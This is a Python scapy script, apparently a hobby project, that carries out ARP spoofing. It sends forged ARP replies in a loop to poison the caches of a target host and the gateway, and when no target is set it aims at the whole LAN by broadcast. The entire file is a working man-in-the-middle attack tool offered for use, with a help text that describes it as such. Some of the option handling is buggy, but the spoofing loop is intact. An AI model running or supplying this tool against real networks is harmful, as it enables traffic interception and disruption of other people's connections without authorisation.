from enum import Flag
from ipaddress import ip_address
from telnetlib import IP
from scapy.all import *
import scapy.layers.l2
import sys
import re
import threading
import time
import netifaces

from scapy.layers.l2 import ARP

# python arpspoofing1.py arpspoofer -i eth0 -t 127.0.0.1 10.7.7.254


SEC = 2.5


def spoof(tip, spoofip, iface2=""):
    packet = ARP(op=2, pdst=tip,
                 hwdst=scapy.layers.l2.getmacbyip(tip), psrc=spoofip)
    if iface2:
        send(packet, iface=iface2, verbose=False)
    else:
        send(packet, verbose=False)


def arpAction(tip, spoofip, Ifac2="", gateway=""):
    count_sendP = 0
    if not gateway:
        while True:
            spoof(tip, spoofip, Ifac2)
            spoof(spoofip, tip, Ifac2)
            count_sendP += 1
            print("\r[*] Packets Sent " + str(count_sendP), end="")
            time.sleep(SEC)
    else:
        while True:
            spoof(tip, spoofip, Ifac2)
            spoof(spoofip, tip, Ifac2)
            spoof(gateway, spoofip, Ifac2)
            count_sendP += 1
            print("\r[*] Packets Sent + GW " + str(count_sendP), end="")
            time.sleep(SEC)


def main():
    target = "255.255.255.255"
    iface = ""
    h = IP(dst="255.255.255.255")
    src = h[IP].src
    gateway = ""
    cmd = ""
    try:
        # cmd = "arpspoofer -i -h -src eth0 -t 127.0.0.1 10.7.7.254"
        for i in range(len(sys.argv) - 1):
            cmd += sys.argv[i + 1] + " "
        print(cmd)
        if (HwlpOption(cmd)):
            print("nain")
            return

        if re.match(
                r"^arpspoofer( -(h|-help))?(( -i| --iface) [A-Za-z0-9]*)?( (-s|--src) \d{1,3}.\d{1,3}.\d{1,3}.\d{1,3})?( (-d|--delay) [1-9][0-9]*)?( -gw)?( (-t|--target) \d{1,3}.\d{1,3}.\d{1,3}.\d{1,3})? $",
                cmd):
            cmd = cmd.split(" ")
            SEC = DelayOption(cmd)
            iface = IFaceOption(cmd)
            src = SrcOption(cmd)
            target = TargetOption(cmd)
            gateway = GWOption(cmd)
            yosi = threading.Thread(
                target=arpAction, args=(target, src, iface, gateway))
            yosi.start()
        else:
            print("ERROR")
    except:
        print("EEEEERRRRRRRRRRROOOOOORRRRR")


def IFaceOption(cmd):
    if "-i" in cmd:
        i = cmd.index("-i")
        return cmd[i + 1]
    elif "--iface" in cmd:
        i = cmd.index("--iface")
        return cmd[i + 1]
    return ""


def DelayOption(cmd):
    if "-d" in cmd:
        i = cmd.index("-d")
        return cmd[i + 1]
    elif "--delay" in cmd:
        i = cmd.index("--delay")
        return cmd[i + 1]
    return 2.5


def SrcOption(cmd):
    if "-s" in cmd:
        i = cmd.index("-s")
        return cmd[i + 1]
    elif "--src" in cmd:
        i = cmd.index("--src")
        return cmd[i + 1]
    gws = netifaces.gateways()
    return gws['default'][netifaces.AF_INET][0]


def TargetOption(cmd):
    if "-t" in cmd:
        i = cmd.index("-t")
        return cmd[i + 1]
    elif "--target" in cmd:
        i = cmd.index("--target")
        return cmd[i + 1]
    return "255.255.255.255"


def GWOption(cmd):
    if "-gw" in cmd:
        gws = netifaces.gateways()
        return gws['default'][netifaces.AF_INET][0]
    return ""


def HwlpOption(cmd):
    if cmd.find("-h") != -1 or cmd.find("--help") != -1:
        print(r"""usage: ArpSpoofer.py [-h] [-i IFACE] [-s SRC] [-d DELAY] [-gw] -t TARGET
Performs an arp spoofing attack on the ip address entered into the Target If no value is entered in the Target then the target is every one in the lan(brodcast).
optional arguments:
 -h, --help show this help message and exit
 -i IFACE, --iface IFACE
 Interface you wish to use
 -s SRC, --src SRC The address you want for the attacker
 -d DELAY, --delay DELAY
 Delay (in seconds) between messages
 -gw should GW be attacked as well
 -t TARGET, --target TARGET IP of target""")
        return True
    return False


def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc


if __name__ == '__main__':
    main()
